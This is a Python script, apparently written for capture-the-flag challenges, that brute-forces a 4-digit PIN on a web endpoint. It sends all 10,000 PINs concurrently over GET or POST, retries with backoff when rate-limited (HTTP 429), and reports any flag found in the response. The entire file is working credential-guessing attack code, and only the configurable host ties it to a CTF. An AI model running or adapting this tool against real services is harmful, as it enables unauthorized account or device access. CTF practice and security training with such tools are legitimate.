#!/usr/bin/env python3
"""
pin_bruteforce.py
Brute-force 4-digit PIN endpoint (CTF use only).

Features:
 - Banner + short description
 - Interactive prompts or CLI args
 - GET/POST, HTTP/HTTPS
 - Timeouts, retries with backoff
 - ThreadPool concurrency
 - Attempts printed on one updating line; successes printed as permanent lines above
 - Optional --stop-on-found to stop after first found
"""

import argparse
import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from threading import Lock

DEFAULT_THREADS = 10

BANNER = r"""
   _______   __    _____  ___       ___________  _______   ________  ___________  _______   _______   
  |   __ "\ |" \  (\"   \|"  \     ("     _   ")/"     "| /"       )("     _   ")/"     "| /"      \  
  (. |__) :)||  | |.\\   \    |     )__/  \\__/(: ______)(:   \___/  )__/  \\__/(: ______)|:        | 
  |:  ____/ |:  | |: \.   \\  |        \\_ /    \/    |   \___  \       \\_ /    \/    |  |_____/   ) 
  (|  /     |.  | |.  \    \. |        |.  |    // ___)_   __/  \\      |.  |    // ___)_  //      /  
 /|__/ \    /\  |\|    \    \ |        \:  |   (:      "| /" \   :)     \:  |   (:      "||:  __   \  
(_______)  (__\_|_)\___|\____\)         \__|    \_______)(_______/       \__|    \_______)|__|  \___) 
                                                                                                          
                                                              
"""

DESCRIPTION = "Simple CTF-style 4-digit PIN brute forcer — run only against authorized targets."

def parse_args():
    p = argparse.ArgumentParser(description="Brute-force 4-digit PIN endpoint (CTF use only).")
    p.add_argument("--host", "-H", help="Target IP or hostname (interactive if omitted)")
    p.add_argument("--port", "-P", type=int, help="Target port (interactive if omitted)")
    p.add_argument("--endpoint", "-e", default="/pin", help="Endpoint path (default: /pin)")
    p.add_argument("--param", "-k", default="pin", help="Query/body parameter name for pin (default: pin)")
    p.add_argument("--method", "-m", choices=["GET", "POST"], default="GET", help="HTTP method (default: GET)")
    p.add_argument("--https", action="store_true", help="Use HTTPS (default: HTTP)")
    p.add_argument("--threads", "-t", type=int, default=DEFAULT_THREADS, help=f"Concurrent threads (default: {DEFAULT_THREADS})")
    p.add_argument("--timeout", type=float, default=5.0, help="Request timeout seconds (default: 5)")
    p.add_argument("--delay", type=float, default=0.0, help="Delay between attempts per thread (seconds)")
    p.add_argument("--retries", type=int, default=3, help="Retry attempts on transient errors (default: 3)")
    p.add_argument("--flag-key", default="flag", help="JSON key that contains the flag (default: flag)")
    p.add_argument("--stop-on-found", action="store_true", help="Stop after finding the first flag (default: keep trying)")
    return p.parse_args()

def interactive_inputs(args):
    if not args.host:
        args.host = input("IP/Host: ").strip()
    if not args.port:
        while True:
            try:
                args.port = int(input("Port: ").strip())
                break
            except ValueError:
                print("Please enter a numeric port.")
    if not args.endpoint:
        args.endpoint = input("Endpoint (e.g., /pin): ").strip() or "/pin"
    if not args.param:
        args.param = input("PIN Parameter (e.g., pin): ").strip() or "pin"
    return args

def make_request(session, method, url, params_or_data, timeout, retries):
    attempt = 0
    backoff = 0.5
    while attempt <= retries:
        try:
            if method == "GET":
                r = session.get(url, params=params_or_data, timeout=timeout)
            else:
                r = session.post(url, data=params_or_data, timeout=timeout)
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            attempt += 1
            time.sleep(backoff)
            backoff *= 2
            continue

        if r.status_code == 429:
            attempt += 1
            time.sleep(backoff)
            backoff *= 2
            continue

        if 500 <= r.status_code < 600:
            attempt += 1
            time.sleep(backoff)
            backoff *= 2
            continue

        # Try JSON; if not JSON, return raw text as second element
        try:
            return r.status_code, r.json()
        except ValueError:
            return r.status_code, r.text

    return None, None

def worker(pin_str, base_url, method, param_name, session, timeout, retries, delay, flag_key):
    """
    Try a single pin. Return tuple (pin_str, flag_or_none, status, body)
    flag_or_none -> actual flag string if found (flag_key in JSON), else None.
    """
    params_or_data = {param_name: pin_str}
    status, data = make_request(session, method, base_url, params_or_data, timeout, retries)

    if delay:
        time.sleep(delay)

    # If JSON dict and contains the flag key
    if isinstance(data, dict) and flag_key in data:
        return pin_str, data[flag_key], status, data

   
    if isinstance(data, str) and data.strip():
        
        low = data.lower()
        if "flag" in low or "ctf{" in low or "{" in low and "}" in low:
            return pin_str, data.strip(), status, data

    return pin_str, None, status, data

def main():
    args = parse_args()
    args = interactive_inputs(args)

    scheme = "https" if args.https else "http"
    endpoint = args.endpoint if args.endpoint.startswith("/") else "/" + args.endpoint
    base_url = f"{scheme}://{args.host}:{args.port}{endpoint}"
    method = args.method.upper()
    param_name = args.param
    flag_key = args.flag_key

    # Print banner + description
    print(BANNER)
    print(DESCRIPTION)
    print("-" * max(len(DESCRIPTION), 40))
    print(f"Target: {base_url}  Method: {method}  Param: {param_name}")
    print(f"Threads: {args.threads}, timeout: {args.timeout}s, retries: {args.retries}, delay: {args.delay}s")
    print("Starting... (Ctrl-C to stop)\n")

    found = []            # list of (pin, flag)
    found_lock = Lock()   # protect 'found' and prints from interleaving

    pins = [f"{i:04d}" for i in range(10000)]

    session = requests.Session()
    session.headers.update({"User-Agent": "CTF-Pin-Bruteforcer/1.0"})

    try:
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = []
            idx = 0
            total = len(pins)

            # Submit initial batch
            while idx < total and len(futures) < args.threads:
                pin = pins[idx]
                fut = ex.submit(worker, pin, base_url, method, param_name, session, args.timeout, args.retries, args.delay, flag_key)
                futures.append((fut, pin))
                idx += 1

            last_shown_pin = None

            while futures:
                # wait for at least one to complete
                done, _ = wait([f for f, _ in futures], return_when=FIRST_COMPLETED, timeout=1.0)

                new_futures = []
                for fut, pin in futures:
                    if fut in done:
                        try:
                            pin_str, flag_val, status, body = fut.result()
                        except Exception as e:
                            with found_lock:
                                # print exception line (permanent)
                                print(f"\n[!] {pin} -> exception: {e}")
                                # continue; don't treat as found
                            pin_str, flag_val = pin, None

                        if flag_val:
                            with found_lock:
                                
                                print() 
                                print(f"Correct PIN found: {pin_str}")
                                display_flag = flag_val if isinstance(flag_val, str) else str(flag_val)
                                if len(display_flag) > 300:
                                    display_flag = display_flag[:300] + " ... (truncated)"
                                print(f"Flag: {display_flag}")
                                found.append((pin_str, display_flag))

                            
                            if args.stop_on_found:
                                print("\nStopping because --stop-on-found was set.")
                                return

                            
                        else:
                           
                            with found_lock:
                                print(f"Attempted PIN: {pin_str}", end="\r", flush=True)
                                last_shown_pin = pin_str

                        
                        if idx < total:
                            next_pin = pins[idx]
                            nfut = ex.submit(worker, next_pin, base_url, method, param_name, session, args.timeout, args.retries, args.delay, flag_key)
                            new_futures.append((nfut, next_pin))
                            idx += 1
                    else:
                        new_futures.append((fut, pin))

                futures = new_futures

            
            with found_lock:
               
                print()

            if found:
                print(f"Finished. Found {len(found)} result(s):")
                for pin, flag in found:
                    print(f" - {pin} -> {flag}")
            else:
                print("Finished. No flags found.")

    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting.")
        sys.exit(1)

if __name__ == "__main__":
    main()
